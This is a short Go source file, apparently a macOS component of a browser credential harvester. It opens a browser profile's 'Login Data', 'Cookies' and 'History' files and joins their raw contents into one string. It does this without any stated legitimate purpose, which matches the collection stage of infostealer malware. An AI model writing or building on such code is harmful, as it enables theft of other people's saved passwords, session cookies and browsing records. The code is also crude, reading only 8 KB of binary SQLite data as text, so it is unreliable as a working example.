//go:build darwin

package cred

import (
"os"
)

type MacBrowserCred struct {
Path string
}

func NewMacBrowserCred(path string) *MacBrowserCred {
return &MacBrowserCred{Path: path}
}

func (m *MacBrowserCred) ReadLoginData() (string, error) {
file, err := os.Open(m.Path + "/Login Data")
if err != nil {
return "", err
}
defer file.Close()
buf := make([]byte, 8192)
n, err := file.Read(buf)
if err != nil {
return "", err
}
return string(buf[:n]), nil
}

func (m *MacBrowserCred) ReadCookies() (string, error) {
file, err := os.Open(m.Path + "/Cookies")
if err != nil {
return "", err
}
defer file.Close()
buf := make([]byte, 8192)
n, err := file.Read(buf)
if err != nil {
return "", err
}
return string(buf[:n]), nil
}

func (m *MacBrowserCred) ReadHistory() (string, error) {
file, err := os.Open(m.Path + "/History")
if err != nil {
return "", err
}
defer file.Close()
buf := make([]byte, 8192)
n, err := file.Read(buf)
if err != nil {
return "", err
}
return string(buf[:n]), nil
}

func (m *MacBrowserCred) GetAllData() (string, error) {
var result string
data, err := m.ReadLoginData()
if err != nil {
return "", err
}
result += data
cookies, err := m.ReadCookies()
if err != nil {
return "", err
}
result += cookies
history, err := m.ReadHistory()
if err != nil {
return "", err
}
result += history
return result, nil
}
